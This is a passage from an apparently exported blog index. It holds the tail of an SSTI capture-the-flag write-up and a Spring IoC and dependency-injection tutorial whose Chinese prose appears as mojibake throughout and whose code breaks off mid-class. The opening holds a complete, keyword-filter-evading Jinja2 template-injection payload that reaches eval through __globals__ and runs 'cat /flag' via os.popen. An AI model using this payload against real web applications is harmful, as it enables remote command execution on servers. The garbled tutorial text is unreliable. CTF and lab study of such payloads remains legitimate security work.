&#123;&#123;b(pld)&#125;&#125;    # eval(&quot;__import__(&#39;os&#39;).popen(&#39;cat &#x2F;flag&#39;).read()&quot;)</span><br><span class="line">			&#123;% endif %&#125;</span><br><span class="line">		&#123;% endfor %&#125;</span><br><span class="line">	&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br><span class="line"></span><br><span class="line"># æœ€åçš„payloadå¦‚ä¸‹:</span><br><span class="line">&#123;% set zero &#x3D; (self|int) %&#125;&#123;% set one &#x3D; (zero**zero)|int %&#125;&#123;% set two &#x3D; (zero-one-one)|abs %&#125;&#123;% set four &#x3D; (two*two)|int %&#125;&#123;% set five &#x3D; (two*two*two)-one-one-one %&#125;&#123;% set three &#x3D; five-one-one %&#125;&#123;% set nine &#x3D; (two*two*two*two-five-one-one) %&#125;&#123;% set seven &#x3D; (zero-one-one-five)|abs %&#125;&#123;% set space &#x3D; self|string|min %&#125;&#123;% set point &#x3D; self|float|string|min %&#125;&#123;% set c &#x3D; dict(c&#x3D;aa)|reverse|first %&#125;&#123;% set bfh &#x3D; self|string|urlencode|first %&#125;&#123;% set bfhc &#x3D; bfh~c %&#125;&#123;% set slas &#x3D; bfhc%((four~seven)|int) %&#125;&#123;% set yin &#x3D; bfhc%((three~nine)|int) %&#125;&#123;% set xhx &#x3D; bfhc%((nine~five)|int) %&#125;&#123;% set right &#x3D; bfhc%((four~one)|int) %&#125;&#123;% set left &#x3D; bfhc%((four~zero)|int) %&#125;&#123;% set but &#x3D; dict(buil&#x3D;aa,tins&#x3D;dd)|join %&#125;&#123;% set imp &#x3D; dict(imp&#x3D;aa,ort&#x3D;dd)|join %&#125;&#123;% set pon &#x3D; dict(po&#x3D;aa,pen&#x3D;dd)|join %&#125;&#123;% set so &#x3D; dict(o&#x3D;aa,s&#x3D;dd)|join %&#125;&#123;% set ca &#x3D; dict(ca&#x3D;aa,t&#x3D;dd)|join %&#125;&#123;% set flg &#x3D; dict(fl&#x3D;aa,ag&#x3D;dd)|join %&#125;&#123;% set ev &#x3D; dict(ev&#x3D;aa,al&#x3D;dd)|join %&#125;&#123;% set red &#x3D; dict(re&#x3D;aa,ad&#x3D;dd)|join %&#125;&#123;% set bul &#x3D; xhx~xhx~but~xhx~xhx %&#125;&#123;% set ini &#x3D; dict(ini&#x3D;aa,t&#x3D;bb)|join %&#125;&#123;% set glo &#x3D; dict(glo&#x3D;aa,bals&#x3D;bb)|join %&#125;&#123;% set itm &#x3D; dict(ite&#x3D;aa,ms&#x3D;bb)|join %&#125;&#123;% set pld &#x3D; xhx~xhx~imp~xhx~xhx~left~yin~so~yin~right~point~pon~left~yin~ca~space~slas~flg~yin~right~point~red~left~right %&#125;&#123;% for f,v in (self|attr(xhx~xhx~ini~xhx~xhx)|attr(xhx~xhx~glo~xhx~xhx)|attr(itm))() %&#125;&#123;% if f &#x3D;&#x3D; bul %&#125;&#123;% for a,b in (v|attr(itm))() %&#125;&#123;% if a &#x3D;&#x3D; ev %&#125;&#123;&#123;b(pld)&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>ssti</tag>
      </tags>
  </entry>
  <entry>
    <title>Springå­¦ä¹ </title>
    <url>/2020/11/10/Spring%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h1 id="Spring"><a href="#Spring" class="headerlink" title="Spring"></a>Spring</h1><h3 id="ä»ä»Šå¤©å¼€å§‹å­¦Sping"><a href="#ä»ä»Šå¤©å¼€å§‹å­¦Sping" class="headerlink" title="ä»ä»Šå¤©å¼€å§‹å­¦Sping"></a>ä»ä»Šå¤©å¼€å§‹å­¦Sping</h3><h5 id="1-IOCç†è®ºæ¨å¯¼ï¼š"><a href="#1-IOCç†è®ºæ¨å¯¼ï¼š" class="headerlink" title="1.IOCç†è®ºæ¨å¯¼ï¼š"></a>1.IOCç†è®ºæ¨å¯¼ï¼š</h5><ul>
<li><p>UserDaoæ¥å£</p>
</li>
<li><p>UserDaomplå®ç°ç±»</p>
</li>
<li><p>Userserviceä¸šåŠ¡æ¥å£</p>
</li>
<li><p>UserServiceimpl ä¸šåŠ¡å®ç°ç±»</p>
<p>åœ¨ä¹‹å‰çš„ä¸šåŠ¡å½“ä¸­ï¼Œç”¨æˆ·çš„éœ€æ±‚ä¼šä¿®æ”¹æˆ‘ä»¬çš„ä»£ç ï¼Œå¯¼è‡´ä»£ç éš¾ä»¥ç»´æŠ¤ï¼Œæ‰€ä»¥æˆ‘ä»¬å¼€å§‹ä½¿ç”¨äº†setå€¼æ¤å…¥ï¼Œsetæ¥å£ï¼Œå®ç°ä¸ç”¨ä¿®æ”¹ä»£ç ï¼Œç”¨æˆ·åªéœ€è¦è°ƒç”¨æ¥å£å°±å¯ä»¥äº†ã€‚</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserServiceimp1</span> <span class="keyword">implements</span> <span class="title">UserService</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> UserDao userDao = <span class="keyword">new</span> UserDaolmp1();</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">getUser</span><span class="params">()</span></span>&#123;</span><br><span class="line">        userDao.getuser();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>å…ˆå‰çš„ä»£ç ï¼Œåœ¨æˆ‘ä»¬è°ƒç”¨UserDaoçš„æ—¶å€™å› ä¸ºå†™æ­»äº†æ‹“å±•ï¼Œæ‰€ä»¥æ— æ³•çµæ´»çš„è°ƒç”¨ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨æ¥å£çš„æ€æƒ³è§£æ”¾</p>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setUserDao</span><span class="params">(UserDao userDao)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.userDao = userDao;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">getUser</span><span class="params">()</span></span>&#123;</span><br><span class="line">        userDao.getuser();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>â€‹    æˆ‘ä»¬å°†ä¹‹å‰å†™æ­»çš„ä»£ç è½¬å˜æˆäº†setæ–¹æ³•ï¼Œè¿™æ ·å­å½“æˆ‘ä»¬äºmainæ–¹æ³•å½“ä¸­ä½¿ç”¨çš„æ—¶å€™ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        UserServiceimp1 userService = <span class="keyword">new</span> UserServiceimp1();</span><br><span class="line"></span><br><span class="line">        userService.setUserDao(<span class="keyword">new</span> UserDaoMysql());</span><br><span class="line">        userService.getUser();</span><br><span class="line"><span class="comment">//        ç”¨æˆ·å®é™…è°ƒç”¨ä¸šåŠ¡å±‚ï¼Œdaoå±‚ä¸éœ€è¦æ¥è§¦</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>ç”¨æˆ·åªéœ€è¦åœ¨setåé¢æ›´æ”¹æ¥å£å°±å¯ä»¥äº†ï¼</p>
<p>IOCçš„ä¸‰å±‚æ¶æ„ï¼šDaoå±‚è´Ÿè´£å®ç°æ–¹æ³•ï¼ŒServiceå±‚è´Ÿè´£è°ƒç”¨Daoçš„æ–¹æ³•ï¼Œè€Œmainæ–¹æ³•å»è°ƒç”¨Serviceçš„æ¥å£</p>
<p>ä½¿ç”¨è¯¥æ–¹æ³•å¤§å¤§é™ä½äº†ä¸šåŠ¡çš„<strong>è€¦åˆæ€§ï¼Œ</strong>ä½¿å¾—ä¸šåŠ¡çš„æ¯ä¸€éƒ¨åˆ†ä¸“å¿ƒäºåšå¥½è‡ªå·±çš„æ¶æ„å³å¯ã€‚</p>
<p><img src="Spring%E5%AD%A6%E4%B9%A0/image-20200620165913816.png" alt="image-20200620165913816"></p>
<h5 id="2-IOCçš„æœ¬è´¨"><a href="#2-IOCçš„æœ¬è´¨" class="headerlink" title="2.IOCçš„æœ¬è´¨"></a>2.IOCçš„æœ¬è´¨</h5><p>â€‹    <strong>æ§åˆ¶åè½¬IoC</strong>(Inversion of Control),æ˜¯ä¸€ç§è®¾è®¡æ€æƒ³ï¼ŒDI(ä¾èµ–æ³¨å…¥)æ˜¯å®ç°IoCçš„ä¸€ç§æ–¹æ³•ï¼Œä¹Ÿæœ‰äººè®¤ä¸ºDIåªæ˜¯IoCçš„å¦-ç§è¯´æ³•ã€‚ æ²¡æœ‰IoCçš„ç¨‹åºä¸­ ,æˆ‘ä»¬ä½¿ç”¨é¢å‘å¯¹è±¡ç¼–ç¨‹ ,å¯¹è±¡çš„åˆ›å»º ä¸å¯¹è±¡é—´çš„ä¾èµ–å…³ç³»å®Œå…¨ç¡¬ç¼–ç åœ¨ç¨‹åºä¸­ï¼Œå¯¹è±¡çš„åˆ›å»ºç”±ç¨‹åºè‡ªå·±æ§åˆ¶ï¼Œæ§åˆ¶åè½¬åå°†å¯¹è±¡çš„åˆ›å»ºè½¬ç§»ç»™ç¬¬ä¸‰æ–¹ï¼Œä¸ªäººè®¤ä¸ºæ‰€è°“æ§åˆ¶åè½¬å°±æ˜¯:è·å¾—ä¾èµ–å¯¹è±¡çš„æ–¹å¼åè½¬äº†ã€‚</p>
<p>â€‹    è€ŒIOCå°±æ˜¯Springçš„æ ¸å¿ƒæ€æƒ³ï¼</p>
<h5 id="3-HelloSpring"><a href="#3-HelloSpring" class="headerlink" title="3.HelloSpring"></a>3.HelloSpring</h5><p>é¦–å…ˆæˆ‘ä»¬éœ€è¦åˆ›å»ºä¸€ä¸ªç±»ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloSpring</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String str;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getStr</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> str;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setStr</span><span class="params">(String str)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.str = str;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">tostring</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;hello&quot;</span>+<span class="string">&quot;str=&quot;</span>+str+<span class="string">&#x27;\&#x27;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>åˆ›å»ºbeans.xmlï¼Œå†™å…¥å¦‚ä¸‹ï¼š</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--        ä½¿ç”¨springåˆ›å»ºå¯¹è±¡ï¼Œè¿™äº›å¯¹è±¡éƒ½ç§°ä¸ºbean--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;hello&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.ysllz.pojo.HelloSpring&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;str&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Spring&quot;</span>/&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--        å±æ€§--&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>åœ¨è¿™é‡Œï¼ŒSpringå¸®æˆ‘ä»¬åšäº†è¿™ä¹ˆä¸€ä¸ªäº‹æƒ…ï¼š</p>
<p>åœ¨javaå½“ä¸­ï¼Œæˆ‘ä»¬åˆ›å»ºç±»çš„æ—¶å€™éƒ½æ˜¯ ç±» å¯¹è±¡å = new å¯¹è±¡ï¼›</p>
<p>è€Œåœ¨Springå½“ä¸­ï¼Œidä¸ºæ³¨å†Œçš„å¯¹è±¡åï¼Œpropertyå½“ä¸­å³å¯è°ƒç”¨ç±»å½“ä¸­çš„æ–¹æ³•ï¼Œvalueç”¨äºç»™æ–¹æ³•çš„å˜é‡èµ‹å€¼ã€‚</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Mytest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"><span class="comment">//        è·å–springçš„ä¸Šä¸‹æ–‡å¯¹è±¡</span></span><br><span class="line">        ClassPathXmlApplicationContext context = <span class="keyword">new</span> ClassPathXmlApplicationContext(<span class="string">&quot;beans.xml&quot;</span>);</span><br><span class="line"><span class="comment">//        æ¥ä¸‹æ¥æˆ‘ä»¬ç”¨Springçš„ç®¡ç†å³å¯</span></span><br><span class="line">        HelloSpring hello = (HelloSpring) context.getBean(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">        System.out.println(hello.tostring());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>é‡ç‚¹å°±æ˜¯ä¸€åˆ‡äº¤ç»™Springï¼Œä¸€åˆ‡å‡½æ•°ä¸å†ç”±ä½ è°ƒç”¨ï¼Œè®©Springè°ƒç”¨å³å¯ã€‚</p>
<h5 id="4-IOCåˆ›å»ºå¯¹è±¡"><a href="#4-IOCåˆ›å»ºå¯¹è±¡" class="headerlink" title="4.IOCåˆ›å»ºå¯¹è±¡"></a>4.IOCåˆ›å»ºå¯¹è±¡</h5><p>â€‹    1.é»˜è®¤ç›´æ¥åˆ›å»ºçš„æ—¶å€™åˆ©ç”¨çš„æ— å‚æ„é€ æ–¹æ³•</p>
<p>â€‹    2.æœ‰å‚æ„é€ çš„æ—¶å€™æˆ‘ä»¬æœ‰ä¸‰ç§æ–¹å¼æ¥å¯¹å‚æ•°è¿›è¡Œæ„é€ ï¼š</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--   é”®å¯¹å€¼çš„æ–¹å¼ï¼Œæœ€ç®€å•--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;hello&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.ysllz.pojo.HelloSpring&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">name</span>=<span class="string">&quot;str&quot;</span> <span class="attr">value</span>=<span class="string">&quot;wuhu&quot;</span>/&gt;</span></span><br><span class="line">        </span><br><span class="line"> <span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">index</span>=<span class="string">&quot;0&quot;</span> <span class="attr">value</span>=<span class="string">&quot;wuhu&quot;</span>/&gt;</span>  <span class="comment">&lt;!--        ç”¨ä¸‹æ ‡æ¥èµ‹å€¼--&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">type</span>=<span class="string">&quot;java.lang.String&quot;</span> <span class="attr">value</span>=<span class="string">&quot;wuhu&quot;</span>/&gt;</span>  <span class="comment">&lt;!--        ç”¨ç±»å‹æ¥èµ‹å€¼ï¼Œä¸æ¨èä½¿ç”¨--&gt;</span></span><br></pre></td></tr></table></figure>



<p><strong>æ³¨æ„äº‹é¡¹:</strong></p>
<p>â€‹        åœ¨Springå½“ä¸­ï¼Œå®é™…ä¸Šå½“æˆ‘ä»¬åˆ©ç”¨Springè¿›è¡ŒContextçš„åˆ›å»ºçš„æ—¶å€™ï¼ŒSpringå·²ç»å°†<strong>å…¨éƒ¨å¯¹è±¡å¯¼å…¥</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ApplicationContext context = <span class="keyword">new</span> ClassPathXmlApplicationContext(<span class="string">&quot;beans.xml&quot;</span>);</span><br><span class="line"><span class="comment">//        æ¥ä¸‹æ¥æˆ‘ä»¬ç”¨Springçš„ç®¡ç†å³å¯</span></span><br><span class="line">HelloSpring hello = (HelloSpring) context.getBean(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">System.out.println(hello.tostring());</span><br></pre></td></tr></table></figure>

<p>ä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æœä½ çš„Beanå½“ä¸­å³ä½¿å«æœ‰å¤šä¸ªç±»ï¼ŒSpringä¹Ÿå°†ä»–ä»¬å…¨éƒ¨å¯¼å…¥å¹¶åˆå§‹åŒ–ï¼Œç”¨æˆ·æƒ³è¦ä»€ä¹ˆå»å–å‡ºæ¥å³å¯ã€‚</p>
<h5 id="5-Springçš„é…ç½®"><a href="#5-Springçš„é…ç½®" class="headerlink" title="5.Springçš„é…ç½®"></a>5.Springçš„é…ç½®</h5><ul>
<li><p>åˆ«å(å·²æ²¡ç”¨äº†)</p>
</li>
<li><p>Beançš„é…ç½®</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;hello&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.ysllz.pojo.HelloSpring&quot;</span> <span class="attr">name</span>=<span class="string">&quot;u1,u2&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">name</span>=<span class="string">&quot;str&quot;</span> <span class="attr">value</span>=<span class="string">&quot;www&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>

<p>åœ¨è¿™é‡Œçš„idå°±æ˜¯æ³¨å†Œåï¼Œclasså°±æ˜¯è°ƒç”¨ç±»<strong>nameå·²ç»å¯ä»¥å–åˆ«åäº†ï¼</strong></p>
</li>
<li><p>Import</p>
<p>ä¾¿äºå¤šäººè¿åŠ¨ï¼Œå¤§ä¼™ä¸€èµ·å¼€å‘çš„æ—¶å€™ï¼Œå°±å¯ä»¥å°†ä»–ä»¬åŒ…å«åœ¨ä¸€èµ·äº†~</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">import</span> <span class="attr">resource</span>=<span class="string">&quot;beans.xml&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>



</li>
</ul>
<h5 id="6-DIä¾èµ–æ³¨å…¥"><a href="#6-DIä¾èµ–æ³¨å…¥" class="headerlink" title="6.DIä¾èµ–æ³¨å…¥"></a>6.DIä¾èµ–æ³¨å…¥</h5><p>â€‹        </p>
<h6 id="6-1æ„é€ æ–¹æ³•æ³¨å…¥"><a href="#6-1æ„é€ æ–¹æ³•æ³¨å…¥" class="headerlink" title="6.1æ„é€ æ–¹æ³•æ³¨å…¥"></a>6.1æ„é€ æ–¹æ³•æ³¨å…¥</h6><p>â€‹    é‡å†™æ„é€ æ–¹æ³•</p>
<h6 id="6-2setæ–¹æ³•æ³¨å…¥ã€é‡ç‚¹ã€‘"><a href="#6-2setæ–¹æ³•æ³¨å…¥ã€é‡ç‚¹ã€‘" class="headerlink" title="6.2setæ–¹æ³•æ³¨å…¥ã€é‡ç‚¹ã€‘"></a>6.2setæ–¹æ³•æ³¨å…¥ã€é‡ç‚¹ã€‘</h6><p>â€‹    ä¾èµ–ï¼šbeansçš„å¯¹è±¡ä¾èµ–äºå®¹å™¨ï¼</p>
<p>â€‹    æ³¨å…¥ï¼šbeadå½“ä¸­çš„æ‰€æœ‰å±æ€§Â·ï¼Œç”±å®¹å™¨æ¥æ³¨å…¥ã€‚</p>
<p><strong>ã€ç¯å¢ƒæ­å»ºã€‘</strong></p>
<p>â€‹    1.å¤æ‚ç±»å‹</p>
<pre><code> 2.çœŸå®æµ‹è¯•å¯¹è±¡</code></pre>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Student</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String string;</span><br><span class="line">    <span class="keyword">private</span> String[] book;</span><br><span class="line">    <span class="keyword">private</span> List&lt;String&gt; hobbies;</span><br><span class="line">    <span class="keyword">private</span> Map&lt;String,String&gt; card;</span><br><span class="line">    <span class="keyword">private</span> Set&lt;String&gt; games;</span><br><span class="line">    <span class="keyword">private</span> String wife;</span><br><span class="line">    <span class="keyword">private</span> Properties info;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>â€‹    3.beans.xml</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;!--    æ™®é€šæ³¨å…¥--&gt;</span><br><span class="line">    &lt;bean id=<span class="string">&quot;hello&quot;</span> <span class="class"><span class="keyword">class</span></span>=<span class="string">&quot;com.ysllz.pojo.HelloSpring&quot;</span> name=<span class="string">&quot;u1,u2&quot;</span>&gt;</span><br><span class="line">        &lt;constructor-arg name=<span class="string">&quot;str&quot;</span> value=<span class="string">&quot;www&quot;</span>/&gt;</span><br><span class="line"></span><br><span class="line">&lt;!--        refæ³¨å…¥--&gt;</span><br><span class="line">    &lt;/bean&gt;</span><br><span class="line">    &lt;bean  id=<span class="string">&quot;address2&quot;</span> <span class="class"><span class="keyword">class</span></span>=<span class="string">&quot;com.ysllz.pojo.Address&quot;</span> /&gt;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    &lt;bean <span class="class"><span class="keyword">class</span></span>=<span class="string">&quot;com.ysllz.pojo.Student&quot;</span> id=<span class="string">&quot;student&quot;</span>&gt;</span><br><span class="line">&lt;!--æ•°ç»„æ³¨å…¥--&gt;</span><br><span class="line">        &lt;property name=<span class="string">&quot;book&quot;</span>&gt;</span><br><span class="line">            &lt;array&gt;</span><br><span class="line">            &lt;value&gt;çº¢æ¥¼æ¢¦&lt;/value&gt;</span><br><span class="line">            &lt;value&gt;æ°´æµ’ä¼ &lt;/value&gt;</span><br><span class="line">            &lt;value&gt;ä¸‰å›½æ¼”ä¹‰&lt;/value&gt;</span><br><span class="line">            &lt;value&gt;è¥¿æ¸¸è®°&lt;/value&gt;</span><br><span class="line">            &lt;/array&gt;</span><br><span class="line">        &lt;/property&gt;</span><br><span class="line">&lt;!--listæ³¨å…¥--&gt;</span><br><span class="line">        &lt;property name=<span class="string">&quot;hobbies&quot;</span>&gt;</span><br><span class="line">            &lt;list&gt;</span><br><span class="line">                &lt;value&gt;èµ·é£&lt;/value&gt;</span><br><span class="line">                &lt;value&gt;èµ·é£&lt;/value&gt;</span><br><span class="line">                &lt;value&gt;èµ·é£&lt;/value&gt;</span><br><span class="line">                &lt;value&gt;èµ·é£&lt;/value&gt;</span><br><span class="line">            &lt;/list&gt;</span><br><span class="line">        &lt;/property&gt;</span><br><span class="line">&lt;!--        mapæ³¨å…¥--&gt;</span><br><span class="line">        &lt;property name=<span class="string">&quot;card&quot;</span>&gt;</span><br><span class="line">            &lt;map&gt;</span><br><span class="line">                &lt;entry key=<span class="string">&quot;èº«ä»½è¯&quot;</span> value=<span class="string">&quot;440000000032001&quot;</span>/&gt;</span><br><span class="line">                &lt;entry key=<span class="string">&quot;é“¶è¡Œå¡&quot;</span> value=<span class="string">&quot;2213123032001&quot;</span>/&gt;</span><br><span class="line">            &lt;/map&gt;</span><br><span class="line">        &lt;/property&gt;</span><br><span class="line">&lt;!--        setæ³¨å…¥--&gt;</span><br><span class="line">        &lt;property name=<span class="string">&quot;games&quot;</span>&gt;</span><br><span class="line">            &lt;set&gt;</span><br><span class="line">                &lt;value&gt;lol&lt;/value&gt;</span><br><span class="line">                &lt;value&gt;cod&lt;/value&gt;</span><br><span class="line">                &lt;value&gt;bot&lt;/value&gt;</span><br><span class="line">            &lt;/set&gt;</span><br><span class="line">        &lt;/property&gt;</span><br><span class="line"></span><br><span class="line">        &lt;property name=&quot;wife&quot; &gt;&lt;null/&gt;&lt;/property&gt;</span><br><span class="line">&lt;!--        é…ç½®æ³¨å…¥--&gt;</span><br><span class="line">        &lt;property name=<span class="string">&quot;info&quot;</span>&gt;</span><br><span class="line">            &lt;props&gt;</span><br><span class="line">                &lt;prop key=&quot;username&quot;&gt;351452024&lt;/prop&gt;</span><br><span class="line">                &lt;prop key=&quot;password&quot;&gt;3125224&lt;/prop&gt;</span><br><span class="line">            &lt;/props&gt;</span><br><span class="line">        &lt;/property&gt;</span><br><span class="line">    &lt;/bean&gt;</span><br><span class="line">    </span><br></pre></td></tr></table></figure>

<p>â€‹    4.æµ‹è¯•ç±»</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Mytest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"><span class="comment">//        è·å–springçš„ä¸Šä¸‹æ–‡å¯¹è±¡</span></span><br><span class="line">        ApplicationContext context = <span class="keyword">new</span> ClassPathXmlApplicationContext(<span class="string">&quot;applicationContext.xml&quot;</span>);</span><br><span class="line"><span class="comment">//        æ¥ä¸‹æ¥æˆ‘ä»¬ç”¨Springçš„ç®¡ç†å³å¯</span></span><br><span class="line">        Student student = (Student) context.getBean(<span class="string">&quot;student&quot;</span>);</span><br><span class="line">        System.out.println(student.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h6 id="6-3å…¶ä»–æ–¹æ³•æ³¨å…¥"><a href="#6-3å…¶ä»–æ–¹æ³•æ³¨å…¥" class="headerlink" title="6.3å…¶ä»–æ–¹æ³•æ³¨å…¥"></a>6.3å…¶ä»–æ–¹æ³•æ³¨å…¥</h6><p>P,å°±æ˜¯setæ³¨å…¥ï¼ŒCå°±æ˜¯åˆ›é€ å™¨æ³¨å…¥</p>
<h1 id="1-Springçš„beançš„æœ¬è´¨"><a href="#1-Springçš„beançš„æœ¬è´¨" class="headerlink" title="1.Springçš„beançš„æœ¬è´¨"></a>1.Springçš„beançš„æœ¬è´¨</h1><p>å®é™…ä¸Šå°±æ˜¯åè½¬ï¼Œæ³¨å…¥çš„å€¼ï¼Œåˆ›å»ºå¯¹è±¡å…¨éƒ¨äº¤ç»™Springçš„XMLæ¥é…ç½®äº†ï¼å®é™…ä¸Šå°±æ˜¯åˆ©ç”¨Setæ³¨å…¥</p>
<p>å›é¡¾æ˜¨å¤©çš„ä»£ç ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//æˆ‘ä»¬ç…§æ ·æ˜¯new äº†ä¸€ä¸ªæ–°çš„å¯¹è±¡</span></span><br><span class="line"><span class="keyword">package</span> com.ys.dao;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserSQLServer</span> <span class="keyword">implements</span> <span class="title">UserDao</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">getUser</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;SQLSERVER use it&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>é‡å†™DAOå±‚çš„æ–¹æ³•ï¼Œä¹‹ååœ¨serviceå±‚å½“ä¸­è¿›è¡Œæ“ä½œï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ys.service;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">UserService</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">getUser</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å†™ä¸€ä¸ªå®ç°æ¥å£ç±»ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ys.service;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.ys.dao.UserDao;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserServiceimpl</span> <span class="keyword">implements</span> <span class="title">UserService</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> UserDao userDao;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> UserDao <span class="title">getUserDao</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> userDao;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setUserDao</span><span class="params">(UserDao userDao)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.userDao = userDao;</span><br><span class="line">    